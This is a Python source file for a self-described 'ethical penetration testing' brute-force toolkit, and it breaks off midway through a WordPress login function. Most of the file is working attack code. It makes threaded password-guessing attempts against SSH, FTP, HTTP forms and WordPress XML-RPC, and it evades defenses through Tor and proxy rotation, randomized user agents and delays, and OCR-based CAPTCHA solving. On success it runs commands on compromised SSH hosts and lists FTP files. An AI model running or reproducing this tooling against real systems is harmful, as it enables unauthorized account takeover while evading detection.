#!/usr/bin/env python3
### BEGIN INIT INFO
# Provides:          brute
# Required-Start:    $network $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Brute
# Description:       A comprehensive toolkit designed for ethical penetration testing, 
#                    featuring brute-force attack capabilities for a wide range of services 
#                    such as SSH, FTP, HTTP, and more. The tool is customizable and 
#                    integrates seamlessly with modern security testing workflows.
# Version:           1.0
# Author:
# + LIONMAD <https://github.com/Midohajhouj>
# License:           MIT License - https://opensource.org/licenses/MIT
# Documentation:     https://github.com/Midohajhouj/Brute-Force-Toolkit/wiki
# Dependencies:      Python 3.x, Requests, Paramiko, bcrypt
# Changelog:         - Initial release.
#                    - Added multi-service support (SSH, FTP, HTTP).
#                    - Optimized password list loading and attack speed.
### END INIT INFO ##

import sys
import importlib
import argparse
import smtplib
import threading
import time
import random
import logging
import signal
import re
import sqlite3
import requests
import configparser
import paramiko
import mysql.connector
import ftplib
from optparse import OptionParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from os import path, makedirs
from tqdm import tqdm
import hashlib
import json
import os
import string
import itertools
from datetime import datetime
import socket
import pytesseract
from PIL import Image
import bcrypt
import socks
import pickle
from logging.handlers import RotatingFileHandler
from ftplib import FTP
from http.client import HTTPConnection
import dns.resolver
import zipfile
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from urllib.parse import urlparse, urljoin
import base64
import binascii
import subprocess
import shlex
import csv
from cryptography.fernet import Fernet
import nmap
import whois
import ssl
import OpenSSL
from ldap3 import Server, Connection, ALL, NTLM
import mechanize
from fake_useragent import UserAgent
import pyodbc
import psycopg2
import pymongo
import redis
import imaplib
import poplib
import vobject
import xmlrpc.client
import sqlalchemy
from sqlalchemy import create_engine
from scapy.all import ARP, Ether, srp
import ipaddress
from pyfiglet import Figlet
from colorama import init, Fore, Back, Style
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
import readline

# Initialize colorama
init()

def check_library(lib_name):
    """Checks if a library is installed and prompts to install it if not."""
    try:
        importlib.import_module(lib_name)
    except ImportError:
        print(f"{lib_name} is not installed.")
        print(f"Install it using: pip install {lib_name} --break-system-packages")
        sys.exit(1)

# ================== Third-Party Libraries ==================
# Check for third-party libraries.
required_libraries = [
    "paramiko", "mysql.connector", "pytesseract", "bcrypt",
    "socks", "tqdm", "requests", "selenium", "bs4", "dns.resolver",
    "nmap", "ldap3", "cryptography",
    "mechanize", "fake_useragent", "pyodbc", "psycopg2", "pymongo",
    "redis", "pyfiglet", "colorama", "scapy", "sqlalchemy"
]

for lib in required_libraries:
    check_library(lib.split(".")[0])

# ================== Configuration ==================
VERSION = "1.0"  # Updated to v1.0
MAX_THREADS = 20  # Reduced default maximum threads
REQUEST_TIMEOUT = 30  # Default timeout in seconds
DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
CONFIG_FILE = '/opt/brute/brute_config.ini'
SESSION_FILE = '/opt/brute/brute_session.dat'
WORDLIST_DIR = '/opt/brute/wordlists'
RESULTS_DIR = '/opt/brute/results'
LOG_FILE = '/opt/brute/brute.log'
TEMP_DIR = '/opt/brute/temp'

# Ensure directories exist
for directory in ['/opt/brute', WORDLIST_DIR, RESULTS_DIR, TEMP_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)
        os.chmod(directory, 0o755)  # Set appropriate permissions
# Color setup
class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM

# ================== Initialization ==================
def initialize():
    """Initialize the toolkit with required checks and configurations"""
    check_dependencies()
    setup_logging()
    display_banner()
    display_disclaimer()
    load_config()
    setup_signal_handlers()

def setup_signal_handlers():
    """Setup signal handlers for graceful exit"""
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def signal_handler(signum, frame):
    """Handle signals for graceful shutdown"""
    print(f"\n{Colors.RED}[!] Received signal {signum}, shutting down...{Colors.RESET}")
    sys.exit(0)

def check_dependencies():
    """Check for required dependencies"""
    required_libraries = [
        "paramiko", "mysql.connector", "pytesseract", "bcrypt",
        "socks", "tqdm", "requests", "selenium", "bs4", "dns.resolver",
        "nmap", "ldap3", "cryptography",
        "mechanize", "fake_useragent", "pyodbc", "psycopg2", "pymongo",
        "redis", "pyfiglet", "colorama", "scapy", "sqlalchemy"
    ]
    
    missing = []
    for lib in required_libraries:
        try:
            importlib.import_module(lib.split(".")[0])
        except ImportError:
            missing.append(lib)
    
    if missing:
        print(f"{Colors.RED}[!] Missing dependencies: {', '.join(missing)}{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Install them using: pip install {' '.join(missing)}{Colors.RESET}")
        sys.exit(1)

def setup_logging():
    """Configure logging system"""
    global logger
    logger = logging.getLogger('brute_toolkit')
    logger.setLevel(logging.INFO)
    
    # File handler with rotation
    log_file = os.path.join(RESULTS_DIR, LOG_FILE)
    file_handler = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)
    file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(file_formatter)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

def load_config():
    """Load configuration from file"""
    global config
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    else:
        # Create default config
        config['DEFAULT'] = {
            'max_threads': str(MAX_THREADS),
            'timeout': str(REQUEST_TIMEOUT),
            'user_agent': DEFAULT_USER_AGENT,
            'tor_proxy': '127.0.0.1:9050',
            'default_wordlists': 'common_usernames.txt,common_passwords.txt',
            'save_session': 'true',
            'max_retries': '3',
            'rate_limit_delay': '2',  # Increased default delay
            'debug_mode': 'false'
        }
        with open(CONFIG_FILE, 'w') as f:
            config.write(f)

# ================== UI Components ==================
def display_banner():
    """Display the tool banner"""
    f = Figlet(font='slant')
    banner = f.renderText('Brute Force Toolkit')
    print(f"{Colors.GREEN}{banner}{Colors.RESET}")
    print(f"{Colors.MAGENTA}Advanced Brute Force Toolkit {Colors.WHITE}v{VERSION}{Colors.RESET}")
    print(f"{Colors.CYAN}Author: LIONMAD{Colors.RESET}")
    print(f"{Colors.YELLOW}Features: Multi-service brute force, Password analysis, Session management,")
    print("DNS/Subdomain enumeration, Web scraping, CAPTCHA solving, and more{Colors.RESET}")
    print()

def display_disclaimer():
    """Display legal disclaimer"""
    print(f"You are responsible for your own actions.{Colors.RESET}")
    
    try:
        input(f"{Colors.BLUE}[?] Press Enter to continue or Ctrl+C to exit...{Colors.RESET}")
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Operation cancelled by user.{Colors.RESET}")
        sys.exit(0)

# ================== Core Functionality ==================
class BruteForceEngine:
    def __init__(self):
        self.proxy_list = []
        self.current_proxy = 0
        self.user_agents = self.load_user_agents()
        self.session = requests.Session()
        self.lock = threading.Lock()
        self.success_count = 0
        self.fail_count = 0
        self.verbose = False
        self.timeout = int(config['DEFAULT'].get('timeout', REQUEST_TIMEOUT))
        self.max_threads = int(config['DEFAULT'].get('max_threads', MAX_THREADS))
        self.delay = 0  # Delay between attempts in seconds
        self.use_tor = False
        self.tor_port = 9050
        self.results_db = os.path.join(RESULTS_DIR, 'brute_results.db')
        self.results_json = os.path.join(RESULTS_DIR, 'brute_results.json')
        self.wordlist_cache = {}
        self.encryption_key = self.load_or_generate_key()
        self.max_retries = int(config['DEFAULT'].get('max_retries', 3))
        self.rate_limit_delay = float(config['DEFAULT'].get('rate_limit_delay', 2))  # Increased default
        self.debug_mode = config['DEFAULT'].getboolean('debug_mode', False)
        self.ua = UserAgent()
        
    def load_or_generate_key(self):
        """Load or generate encryption key for sensitive data"""
        key_file = os.path.join(RESULTS_DIR, '.encryption_key')
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            os.chmod(key_file, 0o600)  # Secure the key file
            return key
    
    def encrypt_data(self, data):
        """Encrypt sensitive data"""
        fernet = Fernet(self.encryption_key)
        return fernet.encrypt(data.encode()).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt sensitive data"""
        fernet = Fernet(self.encryption_key)
        return fernet.decrypt(encrypted_data.encode()).decode()
    
    def load_user_agents(self):
        """Load user agents from file or use defaults"""
        user_agent_file = os.path.join(WORDLIST_DIR, 'user_agents.txt')
        try:
            with open(user_agent_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'
            ]
    
    def rotate_user_agent(self):
        """Rotate user agent for requests"""
        try:
            return self.ua.random
        except:
            return random.choice(self.user_agents)
    
    def load_proxies(self, proxy_file):
        """Load proxies from file"""
        try:
            with open(proxy_file, 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(self.proxy_list)} proxies from {proxy_file}")
            return True
        except Exception as e:
            logger.error(f"Failed to load proxies: {e}")
            return False
    
    def rotate_proxy(self):
        """Rotate to next available proxy"""
        if not self.proxy_list:
            return None
        
        with self.lock:
            self.current_proxy = (self.current_proxy + 1) % len(self.proxy_list)
            proxy = self.proxy_list[self.current_proxy]
            
            if self.verbose:
                logger.info(f"Rotated to proxy: {proxy}")
            
            return proxy
    
    def setup_tor(self, port=9050):
        """Configure Tor proxy settings"""
        self.use_tor = True
        self.tor_port = port
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port)
        socket.socket = socks.socksocket
        
        # Test Tor connection
        try:
            test_ip = self.get_external_ip()
            logger.info(f"Tor connection established. External IP: {test_ip}")
            return True
        except Exception as e:
            logger.error(f"Tor connection failed: {e}")
            self.use_tor = False
            return False
    
    def get_external_ip(self):
        """Get current external IP address"""
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=10)
            return response.json().get('ip', 'Unknown')
        except:
            return 'Unknown'
    
    def password_strength(self, password):
        """Check password strength with detailed analysis"""
        strength = 0
        length = len(password)
        feedback = []
        
        # Length check
        if length >= 16:
            strength += 3
            feedback.append("Excellent length (16+ characters)")
        elif length >= 12:
            strength += 2
            feedback.append("Good length (12-15 characters)")
        elif length >= 8:
            strength += 1
            feedback.append("Minimum length (8-11 characters)")
        else:
            feedback.append("Too short (less than 8 characters)")
            
        # Character diversity
        has_upper = re.search(r"[A-Z]", password)
        has_lower = re.search(r"[a-z]", password)
        has_digit = re.search(r"[0-9]", password)
        has_special = re.search(r"[!@#$%^&*()_+\-=\[\]{};':\"\\|,.<>\/?]", password)
        
        if has_upper:
            strength += 1
            feedback.append("Contains uppercase letters")
        if has_lower:
            strength += 1
            feedback.append("Contains lowercase letters")
        if has_digit:
            strength += 1
            feedback.append("Contains numbers")
        if has_special:
            strength += 2  # Extra points for special chars
            feedback.append("Contains special characters")
            
        # Common patterns check
        common_patterns = [
            '123', 'abc', 'qwerty', 'password', 'admin', 'welcome', 'login'
        ]
        
        if any(pattern in password.lower() for pattern in common_patterns):
            strength = max(0, strength - 2)
            feedback.append("Contains common weak patterns")
            
        # Entropy calculation
        charset_size = 0
        if has_upper: charset_size += 26
        if has_lower: charset_size += 26
        if has_digit: charset_size += 10
        if has_special: charset_size += 32
        
        if charset_size > 0:
            entropy = length * (charset_size ** 0.5)
            if entropy > 100:
                strength += 2
                feedback.append("High entropy (complexity)")
            elif entropy > 50:
                strength += 1
                feedback.append("Moderate entropy")
            else:
                feedback.append("Low entropy (predictable)")
                
        # Check against common password lists
        common_passwords = self.load_wordlist('common_passwords.txt')
        if password in common_passwords:
            strength = max(0, strength - 3)
            feedback.append("Found in common password lists")
                
        # Final strength rating
        strength = min(10, strength)  # Cap at 10
        
        return {
            'score': strength,
            'feedback': feedback,
            'length': length,
            'has_upper': bool(has_upper),
            'has_lower': bool(has_lower),
            'has_digit': bool(has_digit),
            'has_special': bool(has_special)
        }
    
    def generate_password_list(self, base_words, rules=None, min_length=6, max_length=32, advanced=True):
        """Generate password list with custom rules"""
        passwords = set()
        chars = string.ascii_letters + string.digits + string.punctuation
        
        for word in base_words:
            word = word.strip()
            if min_length <= len(word) <= max_length:
                passwords.add(word)
                
            # Common mutations
            passwords.add(word.capitalize())
            passwords.add(word.upper())
            passwords.add(word.lower())
            passwords.add(word + '123')
            passwords.add(word + '!')
            passwords.add(word + '1')
            passwords.add('1' + word)
            passwords.add(word + str(datetime.now().year))
            passwords.add(word + '@')
            passwords.add(word + '2023')
            passwords.add(word + '2024')
            
            if advanced:
                # Advanced mutations
                for i in range(1, 4):
                    for combo in itertools.product(chars, repeat=i):
                        suffix = ''.join(combo)
                        passwords.add(word + suffix)
                        passwords.add(suffix + word)
                        passwords.add(suffix + word + suffix)
                        
                # Leet substitutions
                leet_word = word
                leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
                for char, replacement in leet_map.items():
                    leet_word = leet_word.replace(char, replacement)
                    leet_word = leet_word.replace(char.upper(), replacement)
                passwords.add(leet_word)
                
                # Reverse the word
                passwords.add(word[::-1])
                    
        if rules:
            passwords = {self.apply_custom_rules(pwd, rules) for pwd in passwords}
            
        return sorted(list(passwords), key=len)
    
    def apply_custom_rules(self, password, rules):
        """Apply custom transformation rules to passwords"""
        for rule in rules:
            if rule == 'upper':
                password = password.upper()
            elif rule == 'lower':
                password = password.lower()
            elif rule == 'capitalize':
                password = password.capitalize()
            elif rule == 'reverse':
                password = password[::-1]
            elif rule == 'leet':
                leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
                password = ''.join(leet_map.get(c.lower(), c) for c in password)
            elif rule.startswith('prefix:'):
                prefix = rule.split(':')[1]
                password = prefix + password
            elif rule.startswith('suffix:'):
                suffix = rule.split(':')[1]
                password = password + suffix
            elif rule.startswith('replace:'):
                old, new = rule.split(':')[1].split(',')
                password = password.replace(old, new)
            elif rule == 'double':
                password = password * 2
            elif rule == 'reflect':
                password = password + password[::-1]
                
        return password
    
    def load_rules(self, rules_file):
        """Load password transformation rules from file"""
        try:
            with open(rules_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Failed to load rules: {e}")
            return []
    
    def save_result(self, service, target, username, password, additional_info=None):
        """Save successful result to database and file"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        strength_analysis = self.password_strength(password)
        
        result = {
            'service': service,
            'target': target,
            'username': username,
            'password': password,
            'timestamp': timestamp,
            'strength': strength_analysis,
            'additional_info': additional_info
        }
        
        # Save to SQLite database
        try:
            conn = sqlite3.connect(self.results_db)
            cursor = conn.cursor()
            cursor.execute('''CREATE TABLE IF NOT EXISTS results
                            (id INTEGER PRIMARY KEY AUTOINCREMENT,
                             service TEXT,
                             target TEXT,
                             username TEXT,
                             password_hash TEXT,
                             timestamp TEXT,
                             strength INTEGER,
                             additional_info TEXT)''')
            
            password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
            cursor.execute('''INSERT INTO results 
                            (service, target, username, password_hash, timestamp, strength, additional_info)
                            VALUES (?, ?, ?, ?, ?, ?, ?)''',
                         (service, target, username, password_hash, timestamp, 
                          strength_analysis['score'], json.dumps(additional_info) if additional_info else None))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Failed to save to database: {e}")
        
        # Save to JSON file
        try:
            with open(self.results_json, 'a') as f:
                f.write(json.dumps(result) + '\n')
        except Exception as e:
            logger.error(f"Failed to save to JSON file: {e}")
            
        logger.info(f"{Colors.GREEN}[+] Success: {service} - {username}:{password}{Colors.RESET}")
        logger.info(f"{Colors.CYAN}[*] Password strength: {strength_analysis['score']}/10{Colors.RESET}")
        for feedback in strength_analysis['feedback']:
            logger.info(f"{Colors.CYAN}    - {feedback}{Colors.RESET}")
            
        self.success_count += 1
    
    def solve_captcha(self, image_url=None, image_path=None, captcha_type='text'):
        """Solve CAPTCHA using OCR, API services, or manual input"""
        if image_url:
            try:
                response = self.session.get(image_url, timeout=self.timeout)
                image_path = os.path.join(TEMP_DIR, 'captcha_temp.png')
                with open(image_path, 'wb') as f:
                    f.write(response.content)
            except Exception as e:
                logger.error(f"Failed to download CAPTCHA: {e}")
                return None
        
        if image_path and os.path.exists(image_path):
            try:
                if captcha_type == 'text':
                    # Try OCR first
                    captcha_text = pytesseract.image_to_string(Image.open(image_path))
                    captcha_text = captcha_text.strip()
                    
                    if len(captcha_text) >= 3:  # Assume valid if at least 3 characters
                        return captcha_text
                    
                    # Fall back to manual input
                    print(f"{Colors.YELLOW}[!] CAPTCHA detected (saved as {image_path}){Colors.RESET}")
                    from PIL import Image as PILImage
                    img = PILImage.open(image_path)
                    img.show()
                    captcha_text = input(f"{Colors.BLUE}[?] Enter CAPTCHA text: {Colors.RESET}").strip()
                    return captcha_text
                
                elif captcha_type == 'recaptcha':
                    print(f"{Colors.YELLOW}[!] reCAPTCHA detected - manual solving required{Colors.RESET}")
                    print(f"{Colors.BLUE}[*] Open the following URL in browser and solve the CAPTCHA:{Colors.RESET}")
                    print(f"{Colors.BLUE}    {image_url or image_path}{Colors.RESET}")
                    captcha_text = input(f"{Colors.BLUE}[?] Enter the CAPTCHA response token: {Colors.RESET}").strip()
                    return captcha_text
                
            except Exception as e:
                logger.error(f"CAPTCHA solving error: {e}")
                return None
        
        return None
    
    def check_service(self, target, port):
        """Check if a service is running on the target"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                result = s.connect_ex((target, port))
                return result == 0
        except Exception as e:
            logger.error(f"Service check failed: {e}")
            return False
    
    def threaded_attack(self, service_func, targets, credentials, max_threads=None):
        """Run brute force attack with threading"""
        if not max_threads:
            max_threads = self.max_threads
            
        total = len(targets) * len(credentials)
        success = 0
        fail = 0
        
        with tqdm(total=total, desc="Brute-Forcing", unit="attempt") as pbar:
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                for target in targets:
                    for cred in credentials:
                        if isinstance(cred, tuple):
                            username, password = cred
                        else:
                            username, password = None, cred
                            
                        futures.append(executor.submit(
                            service_func, target, username, password, pbar
                        ))
                
                for future in as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            success += 1
                        else:
                            fail += 1
                    except Exception as e:
                        logger.error(f"Thread error: {e}")
                        fail += 1
        
        logger.info(f"Attack completed. Success: {success}, Failed: {fail}")
        return success, fail
    
    def save_session(self):
        """Save current session state"""
        if not config['DEFAULT'].getboolean('save_session', True):
            return
            
        session_data = {
            'proxy_list': self.proxy_list,
            'current_proxy': self.current_proxy,
            'success_count': self.success_count,
            'fail_count': self.fail_count,
            'session_cookies': pickle.dumps(self.session.cookies),
            'tor_port': self.tor_port,
            'use_tor': self.use_tor
        }
        
        try:
            with open(SESSION_FILE, 'wb') as f:
                pickle.dump(session_data, f)
            logger.info("Session state saved")
        except Exception as e:
            logger.error(f"Failed to save session: {e}")
    
    def load_session(self):
        """Load saved session state"""
        if not os.path.exists(SESSION_FILE):
            return False
            
        try:
            with open(SESSION_FILE, 'rb') as f:
                session_data = pickle.load(f)
                
            self.proxy_list = session_data.get('proxy_list', [])
            self.current_proxy = session_data.get('current_proxy', 0)
            self.success_count = session_data.get('success_count', 0)
            self.fail_count = session_data.get('fail_count', 0)
            self.tor_port = session_data.get('tor_port', 9050)
            self.use_tor = session_data.get('use_tor', False)
            
            if 'session_cookies' in session_data:
                self.session.cookies = pickle.loads(session_data['session_cookies'])
                
            logger.info("Session state loaded")
            return True
        except Exception as e:
            logger.error(f"Failed to load session: {e}")
            return False
    
    def load_wordlist(self, wordlist_name):
        """Load wordlist from file with caching"""
        if wordlist_name in self.wordlist_cache:
            return self.wordlist_cache[wordlist_name]
            
        wordlist_path = os.path.join(WORDLIST_DIR, wordlist_name)
        if not os.path.exists(wordlist_path):
            # Check if it's a default wordlist
            default_wordlists = config['DEFAULT'].get('default_wordlists', '').split(',')
            if wordlist_name in default_wordlists:
                # Try to download default wordlist
                self.download_default_wordlist(wordlist_name)
            
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
                self.wordlist_cache[wordlist_name] = wordlist
                return wordlist
        except Exception as e:
            logger.error(f"Failed to load wordlist {wordlist_name}: {e}")
            return []
    
    def download_default_wordlist(self, wordlist_name):
        """Download default wordlist if not available"""
        wordlist_urls = {
            'common_usernames.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt',
            'common_passwords.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt',
            'common_subdomains.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt',
            'common_ssh_passwords.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou-75.txt',
            'common_http_usernames.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names.txt',
            'common_dorks.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt',
            'web_application_usernames.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names.txt',
            'default_wordlist.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt',
            'common_api_keys.txt': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common-apis.txt'
        }
        
        if wordlist_name in wordlist_urls:
            try:
                response = requests.get(wordlist_urls[wordlist_name], timeout=30)
                wordlist_path = os.path.join(WORDLIST_DIR, wordlist_name)
                with open(wordlist_path, 'w') as f:
                    f.write(response.text)
                logger.info(f"Downloaded default wordlist: {wordlist_name}")
                return True
            except Exception as e:
                logger.error(f"Failed to download wordlist {wordlist_name}: {e}")
                return False
        return False
    
    # ================== Service Modules ==================
    def ssh_brute(self, host, username, password, pbar=None):
        """Improved SSH brute force with better error handling"""
        for attempt in range(self.max_retries):
            try:
                # Random delay to avoid pattern detection
                time.sleep(random.uniform(0.1, self.delay))
                
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Configure socket first
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((host, 22))
                
                # Create transport with our pre-connected socket
                transport = paramiko.Transport(sock)
                transport.start_client()
                
                try:
                    transport.auth_password(username=username, password=password)
                    
                    if transport.is_authenticated():
                        # Execute a simple command to verify access
                        channel = transport.open_session()
                        channel.exec_command('whoami')
                        whoami = channel.recv(1024).decode().strip()
                        
                        # Get system info
                        channel = transport.open_session()
                        channel.exec_command('uname -a')
                        system_info = channel.recv(1024).decode().strip()
                        
                        self.save_result('SSH', host, username, password, {
                            'whoami': whoami,
                            'system_info': system_info
                        })
                        transport.close()
                        
                        if pbar:
                            pbar.update(1)
                        return True
                except paramiko.AuthenticationException:
                    if self.verbose:
                        logger.debug(f"Failed SSH attempt: {username}:{password}")
                    break  # No point retrying auth failures
                except paramiko.SSHException as e:
                    if "Error reading SSH protocol banner" in str(e):
                        logger.warning(f"SSH banner error - may be rate limited")
                        time.sleep(self.rate_limit_delay)
                        continue
                    else:
                        logger.error(f"SSH error: {e}")
                        break
                finally:
                    transport.close()
            except socket.error as e:
                logger.error(f"Socket error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
            except Exception as e:
                logger.error(f"SSH connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def ftp_brute(self, host, username, password, pbar=None):
        """Brute force FTP service"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                ftp = FTP(host, timeout=self.timeout)
                ftp.login(username, password)
                
                # Verify access by getting current directory
                current_dir = ftp.pwd()
                
                # Try to list files
                files = []
                try:
                    ftp.retrlines('LIST', files.append)
                except:
                    files = ["<listing not available>"]
                
                self.save_result('FTP', host, username, password, {
                    'current_dir': current_dir,
                    'files': files[:10]  # Save first 10 files to avoid too much data
                })
                ftp.quit()
                
                if pbar:
                    pbar.update(1)
                return True
            except ftplib.error_perm as e:
                if '530' in str(e):  # Authentication failed
                    if self.verbose:
                        logger.debug(f"Failed FTP attempt: {username}:{password}")
                    break
                else:
                    logger.error(f"FTP error: {e}")
                    time.sleep(self.rate_limit_delay)
                    continue
            except Exception as e:
                logger.error(f"FTP connection error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def http_form_brute(self, url, username, password, pbar=None):
        """Brute force HTTP form authentication"""
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                # First get the login page to check for CSRF tokens
                headers = {
                    'User-Agent': self.rotate_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
                
                response = self.session.get(url, headers=headers, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all potential form inputs
                form_data = {}
                login_form = None
                
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    if any(keyword in form_action.lower() or 
                           keyword in str(form).lower() for keyword in ['login', 'auth', 'signin']):
                        login_form = form
                        break
                
                if not login_form:
                    login_form = soup.find('form')  # Fall back to first form
                
                if not login_form:
                    logger.error("No login form found")
                    break
                    
                for input_tag in login_form.find_all('input'):
                    if input_tag.get('type') in ['hidden', 'text', 'password', 'email']:
                        name = input_tag.get('name')
                        value = input_tag.get('value', '')
                        if name:
                            form_data[name] = value
                
                # Update with credentials
                username_field = 'username' if 'username' in form_data else \
                                next((k for k in form_data.keys() if 'user' in k.lower()), None)
                password_field = 'password' if 'password' in form_data else \
                                next((k for k in form_data.keys() if 'pass' in k.lower()), None)
                
                if username_field:
                    form_data[username_field] = username
                if password_field:
                    form_data[password_field] = password
                
                # Add common submit fields if they don't exist
                if 'login' not in form_data and 'submit' not in form_data:
                    form_data['login'] = 'Login'
                    form_data['submit'] = 'Submit'
                
                # Submit the form
                action = login_form.get('action', url)
                if not action.startswith('http'):
                    if action.startswith('/'):
                        parsed_url = urlparse(url)
                        action = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
                    else:
                        action = urljoin(url, action)
                        
                response = self.session.post(action, data=form_data, headers=headers, timeout=self.timeout)
                
                # Check for successful login (customize based on target)
                login_indicators = [
                    'logout', 'welcome', 'dashboard', 'my account',
                    f'welcome, {username.lower()}', 'sign out', 'log out'
                ]
                
                if any(indicator in response.text.lower() for indicator in login_indicators):
                    self.save_result('HTTP Form', url, username, password, {
                        'response_url': response.url,
                        'response_code': response.status_code
                    })
                    
                    if pbar:
                        pbar.update(1)
                    return True
                    
                # Check for CAPTCHA
                if 'captcha' in response.text.lower():
                    captcha_solved = False
                    for img_tag in BeautifulSoup(response.text, 'html.parser').find_all('img'):
                        img_src = img_tag.get('src', '')
                        if 'captcha' in img_src.lower():
                            captcha_text = self.solve_captcha(image_url=img_src)
                            if captcha_text:
                                form_data['captcha'] = captcha_text
                                response = self.session.post(action, data=form_data, headers=headers)
                                if any(indicator in response.text.lower() for indicator in login_indicators):
                                    self.save_result('HTTP Form', url, username, password, {
                                        'response_url': response.url,
                                        'response_code': response.status_code,
                                        'captcha_used': True
                                    })
                                    if pbar:
                                        pbar.update(1)
                                    return True
                            break
            except Exception as e:
                logger.error(f"HTTP Form error: {e}")
                time.sleep(self.rate_limit_delay)
                continue
        
        if pbar:
            pbar.update(1)
        return False
    
    def wordpress_brute(self, url, username, password, pbar=None):
        """Brute force WordPress login with XML-RPC and wp-login.php"""
        # Try XML-RPC first as it's often less protected
        xmlrpc_success = self.wordpress_xmlrpc_brute(url, username, password)
        if xmlrpc_success:
            if pbar:
                pbar.update(1)
            return True
            
        # Fall back to traditional wp-login.php
        for attempt in range(self.max_retries):
            try:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                login_url = url if url.endswith('/wp-login.php') else url.rstrip('/') + '/wp-login.php'
                
                # First get the login page to check for nonce
                headers = {
                    'User-Agent': self.rotate_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
                
